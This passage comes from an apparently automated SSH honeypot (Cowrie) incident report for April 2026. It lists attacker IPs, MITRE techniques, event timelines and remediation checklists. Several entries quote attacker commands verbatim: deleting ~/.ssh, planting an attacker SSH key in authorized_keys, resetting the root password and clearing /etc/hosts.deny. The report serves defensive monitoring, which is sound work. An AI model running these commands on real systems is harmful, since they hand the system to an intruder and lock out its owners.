- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f27a36db55

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:19 |
| **Last Seen** | 2026-04-17 21:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:19:49` | `cowrie.session.connect` |
| `2026-04-17 21:19:49` | `cowrie.client.version` |
| `2026-04-17 21:19:49` | `cowrie.client.kex` |
| `2026-04-17 21:19:50` | `cowrie.login.success` |
| `2026-04-17 21:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a39e825f4b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]179` |
| **First Seen** | 2026-04-17 22:33 |
| **Last Seen** | 2026-04-17 22:38 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:33:52` | `cowrie.session.connect` |
| `2026-04-17 22:33:52` | `cowrie.client.version` |
| `2026-04-17 22:33:52` | `cowrie.client.kex` |
| `2026-04-17 22:33:53` | `cowrie.login.success` |
| `2026-04-17 22:33:53` | `cowrie.session.params` |
| `2026-04-17 22:33:53` | `cowrie.command.input` |
| `2026-04-17 22:33:53` | `cowrie.command.failed` |
| `2026-04-17 22:33:53` | `cowrie.log.closed` |
| `2026-04-17 22:33:54` | `cowrie.session.params` |
| `2026-04-17 22:33:54` | `cowrie.command.input` |
| `2026-04-17 22:33:54` | `cowrie.session.file_download` |
| `2026-04-17 22:33:54` | `cowrie.log.closed` |
| `2026-04-17 22:34:04` | `cowrie.session.params` |
| `2026-04-17 22:34:04` | `cowrie.command.input` |
| `2026-04-17 22:34:04` | `cowrie.log.closed` |
| `2026-04-17 22:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]179` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2bb8cd83331

| Field | Detail |
|---|---|
| **Source IP** | `52.233.193[.]61` |
| **First Seen** | 2026-04-17 22:34 |
| **Last Seen** | 2026-04-17 22:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:34:54` | `cowrie.session.connect` |
| `2026-04-17 22:34:54` | `cowrie.client.version` |
| `2026-04-17 22:34:54` | `cowrie.client.kex` |
| `2026-04-17 22:34:55` | `cowrie.login.success` |
| `2026-04-17 22:34:55` | `cowrie.session.params` |
| `2026-04-17 22:34:55` | `cowrie.command.input` |
| `2026-04-17 22:34:55` | `cowrie.command.failed` |
| `2026-04-17 22:34:55` | `cowrie.log.closed` |
| `2026-04-17 22:34:56` | `cowrie.session.params` |
| `2026-04-17 22:34:56` | `cowrie.command.input` |
| `2026-04-17 22:34:56` | `cowrie.session.file_download` |
| `2026-04-17 22:34:56` | `cowrie.log.closed` |
| `2026-04-17 22:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.233.193[.]61` to AbuseIPDB if not already reported
- [ ] Block `52.233.193[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40376e8c5e10

| Field | Detail |
|---|---|
| **Source IP** | `52.233.193[.]61` |
| **First Seen** | 2026-04-17 22:34 |
| **Last Seen** | 2026-04-17 22:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:34:58` | `cowrie.session.connect` |
| `2026-04-17 22:34:58` | `cowrie.client.version` |
| `2026-04-17 22:34:58` | `cowrie.client.kex` |
| `2026-04-17 22:34:59` | `cowrie.login.success` |
| `2026-04-17 22:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.233.193[.]61` to AbuseIPDB if not already reported
- [ ] Block `52.233.193[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05ed7728742

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-04-17 22:34 |
| **Last Seen** | 2026-04-17 22:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:34:59` | `cowrie.session.connect` |
| `2026-04-17 22:34:59` | `cowrie.client.version` |
| `2026-04-17 22:34:59` | `cowrie.client.kex` |
| `2026-04-17 22:35:00` | `cowrie.login.success` |
| `2026-04-17 22:35:00` | `cowrie.session.params` |
| `2026-04-17 22:35:00` | `cowrie.command.input` |
| `2026-04-17 22:35:00` | `cowrie.command.failed` |
| `2026-04-17 22:35:01` | `cowrie.log.closed` |
| `2026-04-17 22:35:01` | `cowrie.session.params` |
| `2026-04-17 22:35:01` | `cowrie.command.input` |
| `2026-04-17 22:35:01` | `cowrie.session.file_download` |
| `2026-04-17 22:35:01` | `cowrie.log.closed` |
| `2026-04-17 22:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779029e438be

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]241` |
| **First Seen** | 2026-04-17 22:35 |
| **Last Seen** | 2026-04-17 22:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:35:04` | `cowrie.session.connect` |
| `2026-04-17 22:35:04` | `cowrie.client.version` |
| `2026-04-17 22:35:04` | `cowrie.client.kex` |
| `2026-04-17 22:35:05` | `cowrie.login.success` |
| `2026-04-17 22:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce118efa1191

| Field | Detail |
|---|---|
| **Source IP** | `14.103.116[.]98` |
| **First Seen** | 2026-04-17 22:36 |
| **Last Seen** | 2026-04-17 22:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:WcTlA09S2ohQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:36:44` | `cowrie.session.connect` |
| `2026-04-17 22:36:44` | `cowrie.client.version` |
| `2026-04-17 22:36:44` | `cowrie.client.kex` |
| `2026-04-17 22:36:45` | `cowrie.login.success` |
| `2026-04-17 22:36:45` | `cowrie.session.params` |
| `2026-04-17 22:36:45` | `cowrie.command.input` |
| `2026-04-17 22:36:45` | `cowrie.command.failed` |
| `2026-04-17 22:36:46` | `cowrie.log.closed` |
| `2026-04-17 22:36:47` | `cowrie.session.params` |
| `2026-04-17 22:36:47` | `cowrie.command.input` |
| `2026-04-17 22:36:47` | `cowrie.session.file_download` |
| `2026-04-17 22:36:47` | `cowrie.log.closed` |
| `2026-04-17 22:36:55` | `cowrie.session.params` |
| `2026-04-17 22:36:55` | `cowrie.command.input` |
| `2026-04-17 22:36:55` | `cowrie.log.closed` |
| `2026-04-17 22:36:55` | `cowrie.session.params` |
| `2026-04-17 22:36:55` | `cowrie.command.input` |
| `2026-04-17 22:36:56` | `cowrie.log.closed` |
| `2026-04-17 22:36:56` | `cowrie.session.params` |
| `2026-04-17 22:36:56` | `cowrie.command.input` |
| `2026-04-17 22:36:56` | `cowrie.session.file_download` |
| `2026-04-17 22:36:56` | `cowrie.log.closed` |
| `2026-04-17 22:36:56` | `cowrie.session.params` |
| `2026-04-17 22:36:56` | `cowrie.command.input` |
| `2026-04-17 22:36:56` | `cowrie.log.closed` |
| `2026-04-17 22:36:57` | `cowrie.session.params` |
| `2026-04-17 22:36:57` | `cowrie.command.input` |
| `2026-04-17 22:36:57` | `cowrie.log.closed` |
| `2026-04-17 22:36:57` | `cowrie.session.params` |
| `2026-04-17 22:36:57` | `cowrie.command.input` |
| `2026-04-17 22:36:57` | `cowrie.command.input` |
| `2026-04-17 22:36:57` | `cowrie.log.closed` |
| `2026-04-17 22:36:58` | `cowrie.session.params` |
| `2026-04-17 22:36:58` | `cowrie.command.input` |
| `2026-04-17 22:36:58` | `cowrie.log.closed` |
| `2026-04-17 22:36:58` | `cowrie.session.params` |
| `2026-04-17 22:36:58` | `cowrie.command.input` |
| `2026-04-17 22:36:58` | `cowrie.log.closed` |
| `2026-04-17 22:36:59` | `cowrie.session.params` |
| `2026-04-17 22:36:59` | `cowrie.command.input` |
| `2026-04-17 22:36:59` | `cowrie.log.closed` |
| `2026-04-17 22:36:59` | `cowrie.session.params` |
| `2026-04-17 22:36:59` | `cowrie.command.input` |
| `2026-04-17 22:36:59` | `cowrie.log.closed` |
| `2026-04-17 22:37:00` | `cowrie.session.params` |
| `2026-04-17 22:37:00` | `cowrie.command.input` |
| `2026-04-17 22:37:00` | `cowrie.log.closed` |
| `2026-04-17 22:37:00` | `cowrie.session.params` |
| `2026-04-17 22:37:00` | `cowrie.command.input` |
| `2026-04-17 22:37:00` | `cowrie.log.closed` |
| `2026-04-17 22:37:01` | `cowrie.session.params` |
| `2026-04-17 22:37:01` | `cowrie.command.input` |
| `2026-04-17 22:37:01` | `cowrie.log.closed` |
| `2026-04-17 22:37:01` | `cowrie.session.params` |
| `2026-04-17 22:37:01` | `cowrie.command.input` |
| `2026-04-17 22:37:01` | `cowrie.log.closed` |
| `2026-04-17 22:37:02` | `cowrie.session.params` |
| `2026-04-17 22:37:02` | `cowrie.command.input` |
| `2026-04-17 22:37:02` | `cowrie.log.closed` |
| `2026-04-17 22:37:02` | `cowrie.session.params` |
| `2026-04-17 22:37:02` | `cowrie.command.input` |
| `2026-04-17 22:37:02` | `cowrie.log.closed` |
| `2026-04-17 22:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.116[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.116[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4888b34319a8

| Field | Detail |
|---|---|
| **Source IP** | `120.48.15[.]138` |
| **First Seen** | 2026-04-17 22:37 |
| **Last Seen** | 2026-04-17 22:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:37:16` | `cowrie.session.connect` |
| `2026-04-17 22:37:16` | `cowrie.client.version` |
| `2026-04-17 22:37:17` | `cowrie.client.kex` |
| `2026-04-17 22:37:19` | `cowrie.login.success` |
| `2026-04-17 22:37:20` | `cowrie.session.params` |
| `2026-04-17 22:37:20` | `cowrie.command.input` |
| `2026-04-17 22:37:20` | `cowrie.command.failed` |
| `2026-04-17 22:37:20` | `cowrie.log.closed` |
| `2026-04-17 22:37:21` | `cowrie.session.params` |
| `2026-04-17 22:37:21` | `cowrie.command.input` |
| `2026-04-17 22:37:21` | `cowrie.session.file_download` |
| `2026-04-17 22:37:21` | `cowrie.log.closed` |
| `2026-04-17 22:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.15[.]138` to AbuseIPDB if not already reported
- [ ] Block `120.48.15[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5380dfb72236

| Field | Detail |
|---|---|
| **Source IP** | `120.48.15[.]138` |
| **First Seen** | 2026-04-17 22:37 |
| **Last Seen** | 2026-04-17 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:37:25` | `cowrie.session.connect` |
| `2026-04-17 22:37:25` | `cowrie.client.version` |
| `2026-04-17 22:37:25` | `cowrie.client.kex` |
| `2026-04-17 22:37:26` | `cowrie.login.success` |
| `2026-04-17 22:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.15[.]138` to AbuseIPDB if not already reported
- [ ] Block `120.48.15[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5749de01abc3

| Field | Detail |
|---|---|
| **Source IP** | `14.103.116[.]98` |
| **First Seen** | 2026-04-17 22:41 |
| **Last Seen** | 2026-04-17 22:41 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:kyih8hkH5FMO"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:41:29` | `cowrie.session.connect` |
| `2026-04-17 22:41:29` | `cowrie.client.version` |
| `2026-04-17 22:41:29` | `cowrie.client.kex` |
| `2026-04-17 22:41:31` | `cowrie.login.success` |
| `2026-04-17 22:41:32` | `cowrie.session.params` |
| `2026-04-17 22:41:32` | `cowrie.command.input` |
| `2026-04-17 22:41:32` | `cowrie.command.failed` |
| `2026-04-17 22:41:32` | `cowrie.log.closed` |
| `2026-04-17 22:41:32` | `cowrie.session.params` |
| `2026-04-17 22:41:32` | `cowrie.command.input` |
| `2026-04-17 22:41:32` | `cowrie.session.file_download` |
| `2026-04-17 22:41:32` | `cowrie.log.closed` |
| `2026-04-17 22:41:45` | `cowrie.session.params` |
| `2026-04-17 22:41:45` | `cowrie.command.input` |
| `2026-04-17 22:41:45` | `cowrie.log.closed` |
| `2026-04-17 22:41:45` | `cowrie.session.params` |
| `2026-04-17 22:41:45` | `cowrie.command.input` |
| `2026-04-17 22:41:45` | `cowrie.log.closed` |
| `2026-04-17 22:41:45` | `cowrie.session.params` |
| `2026-04-17 22:41:45` | `cowrie.command.input` |
| `2026-04-17 22:41:46` | `cowrie.session.file_download` |
| `2026-04-17 22:41:46` | `cowrie.log.closed` |
| `2026-04-17 22:41:46` | `cowrie.session.params` |
| `2026-04-17 22:41:46` | `cowrie.command.input` |
| `2026-04-17 22:41:46` | `cowrie.log.closed` |
| `2026-04-17 22:41:46` | `cowrie.session.params` |
| `2026-04-17 22:41:46` | `cowrie.command.input` |
| `2026-04-17 22:41:47` | `cowrie.log.closed` |
| `2026-04-17 22:41:47` | `cowrie.session.params` |
| `2026-04-17 22:41:47` | `cowrie.command.input` |
| `2026-04-17 22:41:47` | `cowrie.command.input` |
| `2026-04-17 22:41:47` | `cowrie.log.closed` |
| `2026-04-17 22:41:47` | `cowrie.session.params` |
| `2026-04-17 22:41:47` | `cowrie.command.input` |
| `2026-04-17 22:41:47` | `cowrie.log.closed` |
| `2026-04-17 22:41:48` | `cowrie.session.params` |
| `2026-04-17 22:41:48` | `cowrie.command.input` |
| `2026-04-17 22:41:48` | `cowrie.log.closed` |
| `2026-04-17 22:41:48` | `cowrie.session.params` |
| `2026-04-17 22:41:48` | `cowrie.command.input` |
| `2026-04-17 22:41:48` | `cowrie.log.closed` |
| `2026-04-17 22:41:49` | `cowrie.session.params` |
| `2026-04-17 22:41:49` | `cowrie.command.input` |
| `2026-04-17 22:41:49` | `cowrie.log.closed` |
| `2026-04-17 22:41:49` | `cowrie.session.params` |
| `2026-04-17 22:41:49` | `cowrie.command.input` |
| `2026-04-17 22:41:49` | `cowrie.log.closed` |
| `2026-04-17 22:41:50` | `cowrie.session.params` |
| `2026-04-17 22:41:50` | `cowrie.command.input` |
| `2026-04-17 22:41:50` | `cowrie.log.closed` |
| `2026-04-17 22:41:50` | `cowrie.session.params` |
| `2026-04-17 22:41:50` | `cowrie.command.input` |
| `2026-04-17 22:41:50` | `cowrie.log.closed` |
| `2026-04-17 22:41:51` | `cowrie.session.params` |
| `2026-04-17 22:41:51` | `cowrie.command.input` |
| `2026-04-17 22:41:51` | `cowrie.log.closed` |
| `2026-04-17 22:41:51` | `cowrie.session.params` |
| `2026-04-17 22:41:51` | `cowrie.command.input` |
| `2026-04-17 22:41:51` | `cowrie.log.closed` |
| `2026-04-17 22:41:51` | `cowrie.session.params` |
| `2026-04-17 22:41:51` | `cowrie.command.input` |
| `2026-04-17 22:41:52` | `cowrie.log.closed` |
| `2026-04-17 22:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.116[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.116[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-975d79b90e9f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.116[.]98` |
| **First Seen** | 2026-04-17 22:42 |
| **Last Seen** | 2026-04-17 22:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:42:53` | `cowrie.session.connect` |
| `2026-04-17 22:42:53` | `cowrie.client.version` |
| `2026-04-17 22:42:53` | `cowrie.client.kex` |
| `2026-04-17 22:42:54` | `cowrie.login.success` |
| `2026-04-17 22:42:55` | `cowrie.session.params` |
| `2026-04-17 22:42:55` | `cowrie.command.input` |
| `2026-04-17 22:42:55` | `cowrie.command.failed` |
| `2026-04-17 22:42:55` | `cowrie.log.closed` |
| `2026-04-17 22:42:56` | `cowrie.session.params` |
| `2026-04-17 22:42:56` | `cowrie.command.input` |
| `2026-04-17 22:42:56` | `cowrie.session.file_download` |
| `2026-04-17 22:42:56` | `cowrie.log.closed` |
| `2026-04-17 22:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.116[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.116[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93a1547b1b58

| Field | Detail |
|---|---|
| **Source IP** | `14.103.116[.]98` |
| **First Seen** | 2026-04-17 22:42 |
| **Last Seen** | 2026-04-17 22:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 22:42:59` | `cowrie.session.connect` |
| `2026-04-17 22:43:00` | `cowrie.client.version` |
| `2026-04-17 22:43:00` | `cowrie.client.kex` |
| `2026-04-17 22:43:01` | `cowrie.login.success` |
| `2026-04-17 22:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.116[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.116[.]98` at perimeter firewall / security group
